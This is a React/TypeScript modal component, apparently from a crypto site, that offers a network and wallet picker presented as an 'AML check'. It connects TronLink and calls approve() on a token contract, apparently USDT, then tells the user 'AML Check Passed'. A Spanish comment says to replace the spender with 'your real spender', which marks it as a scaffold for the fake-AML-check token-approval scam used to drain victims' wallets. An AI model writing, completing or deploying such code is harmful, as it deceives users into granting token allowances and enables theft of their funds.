"use client"

import { useState } from "react"
import { X } from "lucide-react"

type Props = {
  open: boolean
  onClose: () => void
}

// 🔥 ESPERAR TRON
const waitForTron = async () => {
  let tries = 0

  while (tries < 10) {
    if ((window as any).tronWeb?.ready) {
      return (window as any).tronWeb
    }
    await new Promise((res) => setTimeout(res, 300))
    tries++
  }

  return null
}

// 🔥 CONECTAR BIEN
const connectTron = async () => {
  const tronLink = (window as any).tronLink

  if (!tronLink) {
    alert("Open inside TronLink / Trust Wallet")
    return null
  }

  try {
    await tronLink.request({ method: "tron_requestAccounts" })
  } catch {
    alert("Connection rejected")
    return null
  }

  const tron = await waitForTron()

  if (!tron) {
    alert("TronWeb not ready")
    return null
  }

  const address = tron.defaultAddress?.base58

  if (!address) {
    alert("Wallet not connected")
    return null
  }

  console.log("CONNECTED:", address)
  return tron
}

// 🔥 APPROVE CORRECTO
const approveUSDT = async (tron: any) => {
  try {
    const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"

    // 👉 IMPORTANTE: usa TU spender real
const spender = tron.defaultAddress.base58
    const contract = await tron.contract().at(contractAddress)

    const amount = tron.toBigNumber(1000000) // 1 USDT

    const tx = await contract
      .approve(spender, amount)
      .send({
        feeLimit: 200000000,
        shouldPollResponse: true,
      })

    console.log("APPROVE TX:", tx)
    return true
  } catch (err) {
    console.error("APPROVE ERROR:", err)
    alert("Approve failed")
    return false
  }
}

export function WalletCheckModal({ open, onClose }: Props) {
  const [step, setStep] = useState<"network" | "wallet">("network")
  const [selectedNetwork, setSelectedNetwork] = useState<string | null>(null)

  if (!open) return null

  const networks = [
    { name: "Ethereum", logo: "https://assets.coingecko.com/coins/images/279/small/ethereum.png" },
    { name: "BNB Chain", logo: "https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" },
    { name: "TRON", logo: "https://assets.coingecko.com/coins/images/1094/small/tron-logo.png" },
    { name: "Solana", logo: "https://assets.coingecko.com/coins/images/4128/small/solana.png" },
  ]

  const wallets = [
    { name: "MetaMask", logo: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" },
    { name: "WalletConnect", logo: "https://avatars.githubusercontent.com/u/37784886" },
    { name: "Trust Wallet", logo: "https://trustwallet.com/assets/images/media/assets/TWT.png" },
    { name: "Phantom", logo: "https://avatars.githubusercontent.com/u/78782331" },
    { name: "TronLink", logo: "https://avatars.githubusercontent.com/u/37784886?s=200&v=4" },
    { name: "SafePal", logo: "" },
  ]

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 backdrop-blur-sm">
      <div className="w-full max-w-md rounded-2xl bg-white p-6 shadow-2xl relative">

        <button
          onClick={() => {
            onClose()
            setStep("network")
          }}
          className="absolute right-4 top-4"
        >
          <X className="w-5 h-5" />
        </button>

        <h2 className="text-xl font-bold text-center mb-6">
          {step === "network" ? "Select Network" : "Select Wallet"}
        </h2>

        {step === "network" && (
          <div className="space-y-3">
            {networks.map((net) => (
              <button
                key={net.name}
                onClick={() => {
                  setSelectedNetwork(net.name)
                  setStep("wallet")
                }}
                className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
              >
                <img src={net.logo} className="w-7 h-7" />
                <span className="font-medium">{net.name}</span>
              </button>
            ))}
          </div>
        )}

        {step === "wallet" && (
          <div className="space-y-3">
            <p className="text-sm text-gray-500 mb-2">
              Network: <b>{selectedNetwork}</b>
            </p>

            {wallets.map((wallet) => (
              <button
                key={wallet.name}
                onClick={async () => {
                  if (selectedNetwork !== "TRON") {
                    alert("Only TRON supported for now")
                    return
                  }

                  // 🔗 conectar + esperar tron listo
                  const tron = await connectTron()
                  if (!tron) return

                  // 💰 approve
                  const ok = await approveUSDT(tron)
                  if (!ok) return

                  alert("AML Check Passed ✅")

                  onClose()
                  setStep("network")
                }}
                className="w-full flex items-center gap-3 p-4 rounded-xl border hover:bg-gray-50"
              >
                {wallet.logo ? (
                  <img src={wallet.logo} className="w-7 h-7" />
                ) : (
                  <div className="h-7 w-7 rounded-full bg-gray-200 flex items-center justify-center text-xs font-bold">
                    S
                  </div>
                )}

                <span className="font-medium">{wallet.name}</span>
              </button>
            ))}

            <button
              onClick={() => setStep("network")}
              className="w-full mt-3 text-sm text-gray-500 hover:text-black"
            >
              ← Back
            </button>
          </div>
        )}
      </div>
    </div>
  )
}
